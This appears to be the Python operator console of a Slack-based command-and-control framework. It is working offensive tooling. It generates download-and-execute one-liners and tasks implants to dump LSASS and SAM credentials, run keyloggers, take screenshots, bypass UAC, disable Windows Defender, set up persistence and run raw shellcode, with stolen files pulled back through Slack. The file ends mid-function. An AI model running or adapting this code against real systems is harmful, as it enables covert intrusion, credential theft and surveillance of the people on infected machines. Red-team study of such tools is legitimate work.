import os
import re
import json
import time
import base64
import random
import string
import sqlite3
import requests
import threading
from cmd import Cmd
from Crypto.Cipher import AES
from urllib.parse import urlparse
from prettytable import PrettyTable
from prettytable import PLAIN_COLUMNS
try:
    from SpookFlare.lib import sfhta, sfvba
except ModuleNotFoundError:
    print("WARNING: SpookFlare not found, clone with \"--recursive\" to be able to generate all stager types.")
try:
    from pypykatz import pypykatz as pypykatzfile
    pypykatzClass = pypykatzfile.pypykatz
except ModuleNotFoundError:
    print("WARNING: pypykatz not found, clone with \"--recursive\" to be able to extract credentials from .dmp files.")


# Global list of all agents
agent_list = []

# List to hold all processed jobs
processed_ids = []

# Connect to database
conn = sqlite3.connect('slackor.db')

# Connect to database and get keys
auths = conn.execute("SELECT * FROM KEYS")
for row in auths:
    token = row[1]
    bearer = row[2]
    AES_SECRET_KEY = row[3]

# Connect to database and get channels
channels = conn.execute("SELECT * FROM CHANNELS")
for row in channels:
    commands = row[1]
    responses = row[2]
    registration = row[3]

# Populate agents list from database
agents = conn.execute("SELECT * FROM AGENTS")
for row in agents:
    agent = row[0]
    agent_list.append(agent)

conn.close()

# Variable to hold all processed jobs
processed_ids = []

# Crypto Stuff
# heavily adapted from https://www.golang123.com/topic/1686
IV = "1337133713371337"
BS = len(AES_SECRET_KEY)
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s: s[0:-ord(s[-1])]


def color(string, color=None):  # Adds colors on Linux
    """
    Change text color for the Linux terminal.
    """

    attr = []
    # bold
    attr.append('1')

    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "yellow":
            attr.append('33')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)


def bad_opsec():  # This is to validate with the user that they want to accept the risk
    response = input(color("This module is not OPSEC safe. Do you want to run it? (Y/n): ", "yellow"))
    if response.upper()[:1] == "Y":
        return True
    else:
        return False


def filter_nonprintable(text):  # Strips out non-ascii chars from responses
    import string
    # Get the difference of all ASCII characters from the set of printable characters
    nonprintable = set([chr(i) for i in range(128)]).difference(string.printable)
    # Use translate to remove all non-printable characters
    return text.translate({ord(character): None for character in nonprintable})


def validate_url(url):  # Check is a URL is valid
    regex = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    if re.match(regex, url) is not None:
        return True
    else:
        return False


def make_stager(filepath):  # Uploads a file to Slack and creates a one-liner to download an execute
    unique = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))
    files = {'file': open(filepath, 'rb')}
    data = {"filename": unique + ".txt", "token": token}
    r = requests.post("https://slack.com/api/files.upload", params=data, files=files)
    result = json.loads(r.text)
    file_id = result["file"]["id"]
    data = {"file": file_id, "token": token}
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    r = requests.post("https://slack.com/api/files.sharedPublicURL", params=data, headers=headers)
    result = json.loads(r.text)
    permalink_public = result["file"]["permalink_public"]
    r = requests.get(permalink_public)
    look_for = 'class="file_header generic_header" href="'
    splitText = r.text.split(look_for, 1)[1]
    url = splitText[0:93]
    print(color("\nOne-liner to download and execute (best)\n", "blue"))
    PSoneliner = "powershell.exe iwr %s -o C:\\Users\\Public\\%s.png; forfiles.exe /p c:\\windows\\system32 /m svchost.exe" \
               " /c C:\\Users\\Public\\%s.png; timeout 2; del C:\\Users\\Public\\%s.png" % (url, unique, unique, unique)
    print(PSoneliner)
    with open("output/" + unique + "_ps.txt", "w") as out_file:
        out_file.write(PSoneliner)
    print(color("Wrote one-liner at output/" + unique + "_ps.txt", "blue"))
    print(color("\nOne-liner (no Powershell): \n", "blue"))
    oneliner = "echo dim http_obj:dim stream_obj:set http_obj = CreateObject(\"Microsoft.XMLHTTP\"):set stream_obj = " \
    "CreateObject(\"ADODB.Stream\"):http_obj.open \"GET\", \"%s\", False:http_obj.send:stream_obj.type = 1" \
    ":stream_obj.open:stream_obj.write http_obj.responseBody:stream_obj.savetofile \"C:\\Users\\Public\\%s.png\", " \
    "2 > bld.vbs && bld.vbs && timeout 3 && del bld.vbs && C:\\Users\\Public\\%s.png" % (url, unique, unique)
    with open("output/" + unique + "_wscript.txt", "w") as out_file:
        out_file.write(oneliner)
    print(oneliner)
    print(color("Wrote one-liner at output/" + unique + "_wscript.txt\n", "blue"))
    return PSoneliner, unique


def registration_monitor(bearer, registration, token, timestamp):  # Checks for newly registered bots
    global agent_list
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"channel": registration,
            "token": token, "oldest": timestamp}
    r = requests.post('https://slack.com/api/channels.history', headers=headers, data=data)
    result = json.loads(r.text)
    try:
        if result["error"]:  # Hit rate limit
            print(color("\n!!! Hit Slack API rate limit !!!\n "
                        "Consider killing agents, increasing beacon times, and/or sending less commands.", "yellow"))
            return
    except KeyError:  # No error condition
        pass
    for bots in result["messages"]:  # Iterate through each message in the channel
        bot = bots["text"]
        bot_info = bot.split(":")
        client_id = (bot_info[0])
        hostname = (bot_info[1])
        user = (bot_info[2])
        ip = (bot_info[3])
        version = (bot_info[4].strip("\n"))
        # Attempt to add agent info to database
        if client_id not in agent_list:
            if client_id.isupper() and len(client_id) == 5:  # Check client ID is valid
                # TODO: Check for SQL injection (fixed maybe?)
                try:
                    conn = sqlite3.connect('slackor.db')
                    conn.execute("INSERT OR IGNORE INTO AGENTS (ID,HOSTNAME,USER,IP,VERSION) VALUES "
                                 "(?,?,?,?,?)", (client_id, hostname, user, ip, version,))
                    conn.commit()
                    conn.close()
                    agent_list.append(client_id)
                    print(color(" New agent...", "red"))
                    print(color(client_id + "     " + hostname + "     " + user + "     " + ip + "     " + version, "blue"))
                except Exception as e:
                    print("Database error inserting new agent" + str(e))


def update_agents():  # Function to check for new agents
    while True:
        timestamp = str(time.time() - 5)[:-1]
        time.sleep(10)
        try:
            registration_monitor(bearer, registration, token, timestamp)
        except requests.exceptions.ConnectionError:
            print("Connection refused")


def send_command(bearer, command, commands, client_id):  # Send a command to a client
    type = "command"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    command = aes_encrypt.encrypt(command)
    data = {"channel": commands, "text": prefix + command}
    print(color("Tasking job " + job_id + " to " + client_id + ":", "blue"))
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


def check_responses():  # Function to check for new job responses
    while True:
        timestamp = str(time.time() - 4)[:-1]
        time.sleep(5)
        try:
            response_check(bearer, responses, token, timestamp)
        except requests.exceptions.ConnectionError:
            print("Connection refused ")


def mimikatz(filepath):
    try:
        mimi = pypykatzClass.parse_minidump_file(filepath)
        results = {}
        results[filepath] = mimi
        for result in results:
            print('FILE: ======== %s =======' % result)
            if isinstance(results[result], str):
                print(results[result])
            else:
                for luid in results[result].logon_sessions:
                    print(str(results[result].logon_sessions[luid]))

                if len(results[result].orphaned_creds) > 0:
                    print('== Orphaned credentials ==')
                    for cred in results[result].orphaned_creds:
                        print(str(cred))
    except:
        print("Could not parse .dmp file with pypykatz, try using mimikatz.exe on Windows.")

def wipe_files():  # Retrieves all the files in workspace and then deletes them
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"token": token}
    r = requests.post('https://slack.com/api/files.list', headers=headers, data=data)
    result = json.loads(r.text)
    for file in result["files"]:
        print(color("Deleting " + file["name"], "blue"))
        data = {"token": token, "file": file["id"]}
        r = requests.post('https://slack.com/api/files.delete', headers=headers, data=data)


def response_check(bearer, responses, token, timestamp):
    aes_encrypt = AES_ENCRYPT()
    global processed_ids
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"channel": responses,
            "token": token, "oldest": timestamp, }
    # This request gets the latest messages from the channel
    r = requests.post('https://slack.com/api/channels.history', headers=headers, data=data)
    # Parse the response
    try:
        result = json.loads(r.text)
    except json.decoder.JSONDecodeError:
        print(r.text)
    longJobs = {}
    # Loop through each message since last check
    try:
        if result["error"]:
            print(color("\nHit Slack API rate limit!!!\n "
                        "Consider killing agents, increasing beacon times, and sending less commands.", "yellow"))
            return
    except KeyError:
        pass
    for demand in reversed(result["messages"]):
        text = demand["text"]
        instructions = text.split(":")
        type = (instructions[2])
        job_id = (instructions[1])
        cid = (instructions[0])
        if cid.isupper() and len(cid) == 5:  # Make sure CID is valid before continuing
            if job_id not in processed_ids:
                if type == "download":  # If type is download, download the file
                    url = base64.b64decode((instructions[3])).decode('UTF-8')
                    processed_ids.append(job_id)
                    parsed_uri = urlparse(url)
                    domain = '{uri.netloc}'.format(uri=parsed_uri)
                    if domain == "files.slack.com":  # Make sure we are only downloading from Slack
                        print(color("\nDownloading Encrypted file at: " + url + "...", "blue"))
                        if url == '':
                            print(color("\nMessage from client " + cid + ":", "blue"))
                            print("File not found.  Validate that the file path is correct.")
                        else:
                            if '/' in url:
                                filename = (url.rsplit('/', 1)[1])
                            else:
                                filename = url
                            # Here we take the Slack URL from the response and download it
                            header = {'Authorization': 'Bearer ' + token}
                            payload = requests.get(url, headers=header)
                            # Todo: Check for path traversal; Slack URLs already cover this but good to double check
                            open("loot/" + filename, 'wb').write(aes_encrypt.decryptFile(payload.content))
                            print(color("Downloaded " + filename + " from " + cid, "blue"))
                            # Post download options
                            if filename.startswith("security_"):  # If it's the last registry hive,run secretsdump.py
                                command = "secretsdump.py LOCAL -sam loot/sam_{} -system loot/sys_{} " \
                                          "-security loot/security_{}".format(cid.lower(), cid.lower(), cid.lower())
                                if os.path.isdir("impacket"):
                                    os.system(command)  # Todo: Migrate to call the python functions from impacket
                                else:
                                    print("Impacket not found, clone with \"--recursive\" "
                                          "to be able to automatically dump hashes")
                            try:
                                if filename.split(".",1)[1] == "dmp":  # If minidump, try to run pypykatz on it
                                    mimikatz("loot/" + filename)
                            except IndexError:
                                pass

                elif type == "output":  # If type is "output" print the result of the command
                    text = aes_encrypt.decrypt(instructions[3]).decode('UTF-8')
                    processed_ids.append(job_id)
                    print(
                        color("\nMessage from client " + cid + " for job " + job_id + ":\n", "blue") + filter_nonprintable(
                            text))

                # Todo: Fix this to accept multiple cont messages from different agents
                elif type == "cont":  # If type is cont, it is a multi-message response. build up the response string.
                    text = instructions[3]
                    try:
                        if longJobs[job_id]:
                            # The key exists, append the message
                            longJobs[job_id] += text
                    except KeyError:
                        # First message from a longJob, initialize the key
                            longJobs[job_id] = text

    if longJobs != "":  # If there are any longJobs, loop through them
        for key in longJobs:
            processed_ids.append(key)
            print(color("\nMessage response for job " + key + ":\n", "blue"))
            try:
                text = aes_encrypt.decrypt(longJobs[key]).decode('UTF-8')
                print(filter_nonprintable(text))
            except UnicodeDecodeError:
                print("Response contains non-unicode characters.  Could not print to terminal.")


def kill(bearer, commands, client_id):  # Function to send a kill command to an agent
    type = "kill"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"channel": commands, "text": prefix}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


def upload(bearer, commands, client_id, file_url):  # Function to upload a file on the target
    type = "upload"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    file = aes_encrypt.encrypt(file_url)
    data = {"channel": commands, "text": prefix + file}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)

def minidump(bearer, commands, client_id):  # dumps lsass on target
    type = "minidump"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    data = {"channel": commands, "text": prefix}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


def upload_file(filepath):  # This function uploads a file given a local(server) file-path
    if '\\' in filepath:
        filename = (filepath.rsplit('\\', 1)[1])
    elif '/' in filepath:
        filename = (filepath.rsplit('/', 1)[1])
    else:
        filename = filepath
    try:
        filepath = filepath.strip('\'').strip('\"')  # Strip quotes
        files = {'file': open(filepath, 'rb')}
        data = {"filename": filename, "token": token}
        r = requests.post("https://slack.com/api/files.upload", params=data, files=files)
        result = json.loads(r.text)
        # Slack URL of the uploaded file
        return result["file"]["url_private_download"]
    except FileNotFoundError:
        print(color("File not Found", "yellow"))
        return False
    except OSError:
        print(color("File not Found", "yellow"))
        return False


def sleep(bearer, commands, client_id, sleeptime):  # Function to send a sleep command to an agent
    type = "sleep"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    sleeptime = aes_encrypt.encrypt(sleeptime)
    data = {"channel": commands, "text": prefix + sleeptime}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


def persist(bearer, commands, client_id, mode):  # Function to add persistence
    type = "persist"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    mode = aes_encrypt.encrypt(mode)
    data = {"channel": commands, "text": prefix + mode}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)

def cleanup(bearer, commands, client_id, mode):  # Function to remove persistence
    type = "clean"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    mode = aes_encrypt.encrypt(mode)
    data = {"channel": commands, "text": prefix + mode}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


def bypassuac(bearer, commands, client_id, mode):  # Function to bypass UAC
    type = "elevate"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    mode = aes_encrypt.encrypt(mode)
    data = {"channel": commands, "text": prefix + mode}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


def screenshot(bearer, commands, client_id):  # Function to screenshot
    type = "screenshot"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"channel": commands, "text": prefix}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)

def samdump(bearer, commands, client_id):  # Function to dump SAM and SYSTEM files
    type = "samdump"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"channel": commands, "text": prefix}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)

def revive(bearer, commands):  # Function to have agents re-register in case some became orphaned
    type = "revive"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes("31337" + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"channel": commands, "text": prefix}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


def sysinfo(bearer, commands, client_id):  # Function gather system info
    type = "sysinfo"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"channel": commands, "text": prefix}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


def duplicate(bearer, commands, client_id):  # spawns another agent
    type = "duplicate"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"channel": commands, "text": prefix}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)

def clipboard(bearer, commands, client_id):  # spawns another agent
    type = "clipboard"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"channel": commands, "text": prefix}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)

def getsystem(bearer, commands, client_id):  # gets SYSTEM privs
    type = "getsystem"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    data = {"channel": commands, "text": prefix}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


def defanger(bearer, commands, client_id, mode):  # Function to de-fang Windows Defender
    type = "defanger"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    mode = aes_encrypt.encrypt(mode)
    data = {"channel": commands, "text": prefix + mode}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)

def keyscan(bearer, commands, client_id, mode):  # Function to manage keylogger
    type = "keyscan"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    mode = aes_encrypt.encrypt(mode)
    data = {"channel": commands, "text": prefix + mode}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)
'''
def metasploit(bearer, commands, client_id, url):  # Function execute Meterpreter on target
    type = "metasploit"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    url = aes_encrypt.encrypt(url)
    data = {"channel": commands, "text": prefix + url}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)
'''
def shellcode(bearer, commands, client_id, filepath):  # Function execute shellcode on target
    type = "shellcode"
    if '\\' in filepath:
        filename = (filepath.rsplit('\\', 1)[1])
    elif '/' in filepath:
        filename = (filepath.rsplit('/', 1)[1])
    else:
        filename = filepath
    try:
        filepath = filepath.strip('\'').strip('\"')  # Strip quotes
        files = {'file': open(filepath, 'rb')}
        data = {"filename": "shellcode.txt", "token": token}
        r = requests.post("https://slack.com/api/files.upload", params=data, files=files)
        result = json.loads(r.text)
        # Slack URL of the uploaded file
        url = result["file"]["url_private_download"]
    except FileNotFoundError:
        print(color("File not Found", "yellow"))
        return False
    except OSError:
        print(color("File not Found", "yellow"))
        return False
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    print (url)
    url = aes_encrypt.encrypt(url)
    data = {"channel": commands, "text": prefix + url}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)

def beacon(bearer, commands, client_id, beacon):  # Function to change beacon time
    type = "beacon"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    aes_encrypt = AES_ENCRYPT()
    beacon = aes_encrypt.encrypt(beacon)
    data = {"channel": commands, "text": prefix + beacon}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


def download(bearer, commands, client_id, filepath):  # Function to retrieve a file from the agent
    type = "download"
    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
    headers = {'Authorization': 'Bearer ' + bearer}
    filepath = filepath.strip('\'').strip('\"')
    aes_encrypt = AES_ENCRYPT()
    filepath = aes_encrypt.encrypt(filepath)
    data = {"channel": commands, "text": prefix + filepath}
    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)


class AES_ENCRYPT(object):  # heavily adapted from https://www.golang123.com/topic/1686
    def __init__(self):
        self.key = AES_SECRET_KEY
        self.mode = AES.MODE_CBC

    def encrypt(self, text):
        cryptor = AES.new(self.key, self.mode, IV)
        self.ciphertext = cryptor.encrypt(pad(text))
        return base64.b64encode(self.ciphertext)

    def decrypt(self, text):
        decode = base64.b64decode(text)
        cryptor = AES.new(self.key, self.mode, IV)
        plain_text = cryptor.decrypt(decode)
        return plain_text

    def decryptFile(self, text):
        cryptor = AES.new(self.key, self.mode, IV)
        plain_text = cryptor.decrypt(text)
        return plain_text


class AgentCmd(Cmd):  # Class for all the modules when interacting with an agent

    def emptyline(self):
        pass

    def do_sleep(self, args):
        """SLEEP - Causes the agent to sleep once.  Time must be in seconds.
             Example: sleep 5"""
        try:
            # Test if value is an integer, bail if not
            sleep_test = int(args)
            sleep(bearer, commands, self.target, args)
            print(color("Tasking " + self.target + " to sleep for " + args + " seconds...", "blue"))
        except ValueError:
            print(color("Sleep value must be an integer.  (Number of seconds)", "yellow"))

    def do_persist(self, args):
        """PERSIST - Establishes persistence on the target
        Example: persist registry"""
        if (args == "scheduler") or (args == "registry"):
                print(color("RISK: Writes to disk, executes cmd.exe", "yellow"))
                if bad_opsec():
                    persist(bearer, commands, self.target, args)
                    print(color("Establishing persistence on " + self.target, "blue"))
        elif args == "wmi":
            conn = sqlite3.connect('slackor.db')
            cursor = conn.execute("SELECT user from AGENTS where id='" + self.target + "'")
            user = cursor.fetchone()
            if user[0].endswith('*'):
                print(color("RISK: Writes to disk, executes cmd.exe", "yellow"))
                if bad_opsec():
                    persist(bearer, commands, self.target, args)
                    print(color("Establishing persistence on " + self.target, "blue"))
        else:
                print(color("Please supply an additional argument [scheduler|registry|wmi]", "blue"))

    def do_cleanup(self, args):
        """CLEANUP - Removes artifacts on disk
        Example: cleanup registry"""
        if (args == "scheduler") or (args == "registry"):
            print(color("RISK: Executes cmd.exe", "yellow"))
            if bad_opsec():
                cleanup(bearer, commands, self.target, args)
                print(color("Removing persistence on " + self.target, "blue"))
            else:
                print(color("You need to specify a persistence method" "Yellow"))
        elif (args == "realtime") or (args == "exclusion") or (args == "signature"):
            print(color("RISK: Executes powershell.exe", "yellow"))
            if bad_opsec():
                cleanup(bearer, commands, self.target, args)
                print(color("Restoring AV on " + self.target, "blue"))

        elif args == "wmi":
            print(color("RISK: Executes powershell.exe", "yellow"))
            if bad_opsec():
                cleanup(bearer, commands, self.target, args)
                print(color("Removing persistence on " + self.target, "blue"))
        else:
            print(color("Please supply an additional argument "
                        "[scheduler|registry|realtime|exclusion|signature]", "blue"))

    def complete_persist(self, text, line, start_index, end_index):
        modes = ["registry", "scheduler", "wmi"]
        if text:
            return [
                mode for mode in modes
                if mode.startswith(text.lower())
            ]
        else:
            return modes

    def complete_cleanup(self, text, line, start_index, end_index):
        modes = ["registry", "scheduler", "exclusion", "realtime", "signature", "wmi"]
        if text:
            return [
                mode for mode in modes
                if mode.startswith(text.lower())
            ]
        else:
            return modes

    def complete_keyscan(self, text, line, start_index, end_index):
        modes = ["stop", "start", "dump"]
        if text:
            return [
                mode for mode in modes
                if mode.startswith(text.lower())
            ]
        else:
            return modes

    def complete_defanger(self, text, line, start_index, end_index):
        modes = ["realtime", "exclusion", "signature"]
        if text:
            return [
                mode for mode in modes
                if mode.startswith(text.lower())
            ]
        else:
            return modes

    def complete_bypassuac(self, text, line, start_index, end_index):
        modes = ["fodhelper", "ask"]
        if text:
            return [
                mode for mode in modes
                if mode.startswith(text.lower())
            ]
        else:
            return modes

    def do_bypassuac(self, args):
        """BYPASSUAC - Attempts to spawn a new agent with high integrity."""
        if args == "fodhelper":
            print(color("RISK: Writes to disk, executes cmd.exe", "yellow"))
            if bad_opsec():
                bypassuac(bearer, commands, self.target, args)
                print(color("Elevating " + self.target, "blue"))

        elif args == "ask":
            print(color("RISK: Writes to disk and pops up a UAC alert!", "yellow"))
            if bad_opsec():
                bypassuac(bearer, commands, self.target, args)
                print(color("Requesting elevation from user on " + self.target, "blue"))
        else:
            print(color("Please supply an additional argument [fodhelper|ask]", "blue"))

    def do_screenshot(self, args):
        """SCREENSHOT - Screenshots the current desktop and downloads files"""
        print(color("RISK: Writes to disk", "yellow"))
        if bad_opsec():
            screenshot(bearer, commands, self.target)
            print(color("screenshotting " + self.target, "blue"))

    def do_samdump(self, args):
        """SAMDUMP - Attempts to dump the SAM, SYSTEM and SECURITY files for offline hash extraction"""
        conn = sqlite3.connect('slackor.db')
        cursor = conn.execute("SELECT user from AGENTS where id='" + self.target + "'")
        user = cursor.fetchone()
        if user[0].endswith('*'):
            print(color("RISK: Writes to disk", "yellow"))
            if bad_opsec():
                samdump(bearer, commands, self.target)
                print(color("Getting SYSTEM, SAM and SECURITY files for " + self.target + "....", "blue"))
        else:
            print(color("Agent not running as high integrity", "yellow"))

    def do_sysinfo(self, args):
        """SYSINFO - Displays the current user, OS version, system architecture, and number of CPU cores"""
        sysinfo(bearer, commands, self.target)
        print(color("Gathering System Information for " + self.target, "blue"))

    def do_clipboard(self, args):
        """CLIPBOARD - Retrieves the content of the clipboard"""
        clipboard(bearer, commands, self.target)
        print(color("Retrieving the clipboard for " + self.target, "blue"))

    def do_duplicate(self, args):
        """DUPLICATE - Causes the agent to spawn another invocation of itself"""
        duplicate(bearer, commands, self.target)
        print(color("Duplicating " + self.target, "blue"))

    def do_keyscan(self, args):
        """keyscan - Starts a keylogger on the system"""
        keyscan(bearer, commands, self.target, args)
        if args == "start":
            print(color("Starting keylogger on " + self.target, "blue"))
        elif args == "stop":
            print(color("Stopping keylogger on " + self.target, "blue"))
        elif args == "dump":
            print(color("Dumping keylogger output for " + self.target, "blue"))
        else:
            print(color("Please supply an additional argument [start|stop|dump]", "blue"))

    def do_getsystem(self, args):
        """GETSYSTEM - Attempts to spawn an agent with SYSTEM privileges"""
        conn = sqlite3.connect('slackor.db')
        cursor = conn.execute("SELECT user from AGENTS where id='" + self.target + "'")
        user = cursor.fetchone()
        if user[0].endswith('*'):
            print(color("RISK: Writes to disk and executed a scheduled task", "yellow"))
            if bad_opsec():
                getsystem(bearer, commands, self.target)
                print(color("Getting SYSTEM on " + self.target, "blue"))
        else:
            print(color("Agent not running as high integrity", "yellow"))

    def do_defanger(self, args):
        """DEFANGER - Attempts to de-fang Windows Defender
        Example: defanger realtime"""
        conn = sqlite3.connect('slackor.db')
        cursor = conn.execute("SELECT user from AGENTS where id='" + self.target + "'")
        user = cursor.fetchone()
        if user[0].endswith('*'):
            if args == "realtime":
                print(color("RISK: Pops a notification on the target and executes powershell.exe", "yellow"))
                if bad_opsec():
                    defanger(bearer, commands, self.target, args)
                    print(color("Disabling Real-time protection on " + self.target, "blue"))
            elif args == "exclusion":
                print(color("RISK: executes powershell.exe", "yellow"))
                if bad_opsec():
                    defanger(bearer, commands, self.target, args)
                    print(color("Adding an AV exclusion for C:\\ on " + self.target, "blue"))

            elif args == "signature":
                print(color("RISK: executes cmd.exe", "yellow"))
                if bad_opsec():
                    defanger(bearer, commands, self.target, args)
                    print(color("Deleting AV signatures on " + self.target, "blue"))
            else:
                print(color("Please supply an additional argument [realtime|exclusion|signature]", "blue"))
        else:
            print(color("Agent not running as high integrity", "yellow"))
    '''
    def do_metasploit(self, args):
        """METASPLOIT - Executes meterpreter on the target over HTTPS.
        MSF payload: windows/x64/meterpreter/reverse_https"""
        print(color("Listener must be windows/x64/meterpreter/reverse_https", "yellow"))
        print(color("RISK: Connection to non-slack IP", "yellow"))
        ip = input("Enter the IP Address: ")
        port = input("Enter the Port Number: ")
        url = "https://" + ip + ":" + port + "/"
        if validate_url(url):
            metasploit(bearer, commands, self.target, url)
            print(color("Sending Meterpreter payload to: " + self.target, "blue"))
        else:
            print("Invalid URL: " + url)
    '''
    def do_shellcode(self, args):
        """SHELLCODE - Executes RAW shellcode.  MUST be 64 bit.
        Example: shellcode /tmp/shellcode64.raw"""
        filepath = args
        shellcode(bearer, commands, self.target, filepath)
        print(color("Executing shellcode on: " + self.target, "blue"))

    def do_beacon(self, args):
        """BEACON - Changes the mean(average)time in seconds that an agent checks for new commands.  20% jitter.
             Example: beacon 5  (Beacons average 5 seconds)"""
        try:
            # Test if value is an integer, bail if not
            beacon_test = int(args)
            beacon(bearer, commands, self.target, args)
